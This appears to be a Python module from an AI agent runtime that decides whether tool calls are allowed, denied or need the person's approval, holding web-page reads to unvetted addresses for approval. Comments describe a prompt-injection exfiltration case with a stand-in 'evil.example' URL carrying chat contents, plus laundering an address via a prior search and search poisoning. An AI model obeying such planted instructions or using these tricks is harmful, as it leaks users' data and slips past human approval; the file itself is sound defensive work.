"""ToolPolicy (R3.2): Allow | Deny(reason) | RequireApproval(payload).

Evaluated by the pipeline after grants and pre_tool hooks, before budgets and
idempotency. It's the adapter point for an external policy engine (P2); the
default enforces the risk-class defaults of CR-003 R14.10.
"""

from __future__ import annotations

import uuid
from dataclasses import dataclass, field
from typing import Any, Protocol
from urllib.parse import urlsplit

from agent_runtime.db import Pool
from agent_runtime.tools.spec import ToolSpec


@dataclass(frozen=True)
class Allow:
    pass


@dataclass(frozen=True)
class Deny:
    reason: str


@dataclass(frozen=True)
class RequireApproval:
    reason: str


PolicyDecision = Allow | Deny | RequireApproval


@dataclass(frozen=True)
class PolicyContext:
    """The run a call belongs to, for policies that look at what it has seen (H3)."""

    run_id: uuid.UUID
    pool: Pool


class ToolPolicy(Protocol):
    async def check(
        self, tool: ToolSpec, args: dict[str, Any], ctx: PolicyContext | None = None
    ) -> PolicyDecision: ...


@dataclass(frozen=True)
class RiskClassPolicy:
    """Defaults per risk class, plus an optional static deny-list from configuration.
    Configuration can make it stricter, never looser (R14.10)."""

    denied_tools: frozenset[str] = field(default_factory=frozenset)

    async def check(
        self, tool: ToolSpec, args: dict[str, Any], ctx: PolicyContext | None = None
    ) -> PolicyDecision:
        if tool.name in self.denied_tools:
            return Deny(f"tool {tool.name!r} is disabled by configuration")
        if tool.risk_class == "external_side_effect":
            return RequireApproval(f"{tool.name} has an external side effect")
        return Allow()


# The page reader's call carries an address the model chose: one it read in a page can
# carry your data out (`https://evil.example/?d=<your chat>`). Allowed without asking:
# addresses that came from YOU (a message in this chat), from a SEARCH result in this
# chat, or on the sites you allowed (Settings → Tools). Anything else asks first.
#
# Of a stored search, only each hit's `url` field counts (phase H10, the external review
# of 2026-11-12). The stored result also carries the model's own `query`: searching the
# whole result as text let a planted instruction launder an address by searching for it
# first, then reading it. Titles and snippets are the engine's, but a page writes them
# (search poisoning), so they don't vouch either. The address is matched INSIDE a
# returned url, so a model that drops a tracking parameter still reads without asking.
# A result that isn't a list of hits (capped, odd, from an older worker) vouches for
# nothing and raises nothing: `jsonb_typeof` keeps `jsonb_array_elements` off scalars.
#
# Of the person's side too, only their words count: the `message` of the run's input and
# the `text` of their messages in this chat. With the scripted test model the input also
# holds the model's replies (`script`, `subagent_scripts`); searched as text, they let a
# scripted replay of the same chain read the page unasked (found by running it on the
# real stack). A field that's missing is NULL, which vouches for nothing.
_SEEN = """
    SELECT 1 FROM runs r
    WHERE r.id = %(run)s AND position(%(url)s IN (r.input ->> 'message')) > 0
    UNION ALL
    SELECT 1 FROM session_messages m
    WHERE m.type = 'user' AND position(%(url)s IN (m.content ->> 'text')) > 0
      AND m.session_id = (SELECT session_id FROM runs WHERE id = %(run)s)
    UNION ALL
    SELECT 1 FROM tool_invocations t,
         jsonb_array_elements(
             CASE WHEN jsonb_typeof(t.result -> 'results') = 'array'
                  THEN t.result -> 'results' ELSE '[]'::jsonb END) AS hit
    WHERE t.tool = 'web_search' AND t.status = 'done'
      AND position(%(url)s IN (hit ->> 'url')) > 0
      AND (t.run_id = %(run)s OR t.run_id IN (
            SELECT id FROM runs
            WHERE session_id = (SELECT session_id FROM runs WHERE id = %(run)s)))
    LIMIT 1
"""


@dataclass(frozen=True)
class ProvenancePolicy:
    """Decorator (phase H3): `inner`'s decision, except that a page address nobody
    gave the agent needs your approval. The approval card shows the full address.

    Who "gave" it is settled by **parse, don't search** (phase H10): the check reads
    named fields of a known shape (the `text` of your messages, the `message` of the
    run's input, each search hit's `url`), never the text of a blob, because a blob
    holds the model's own words too (R14.15: what the model wrote under influence is
    not provenance)."""

    inner: ToolPolicy
    tools: frozenset[str] = frozenset({"read_webpage"})

    async def check(
        self, tool: ToolSpec, args: dict[str, Any], ctx: PolicyContext | None = None
    ) -> PolicyDecision:
        decision = await self.inner.check(tool, args, ctx)
        if not isinstance(decision, Allow) or tool.name not in self.tools or ctx is None:
            return decision
        url = str(args.get("url") or "").strip()
        if not url or await _given(ctx, url):
            return decision
        return RequireApproval(
            f"{url} didn't come from you or from a search result: reading it may send "
            "what's in its address to that site"
        )


async def _given(ctx: PolicyContext, url: str) -> bool:
    """Did this address (or the page it names) reach the run from the person or a
    search, or is its site one the person allowed?"""
    async with ctx.pool.connection() as conn:
        cur = await conn.execute(_SEEN, {"run": ctx.run_id, "url": url.rstrip("/")})
        if await cur.fetchone() is not None:
            return True
        cur = await conn.execute("SELECT web_allowlist FROM tool_settings LIMIT 1")
        row = await cur.fetchone()
    allowed = [str(s).lower() for s in ((row or {}).get("web_allowlist") or [])]
    host = (urlsplit(url).hostname or "").lower()
    return any(host == site or host.endswith("." + site) for site in allowed)
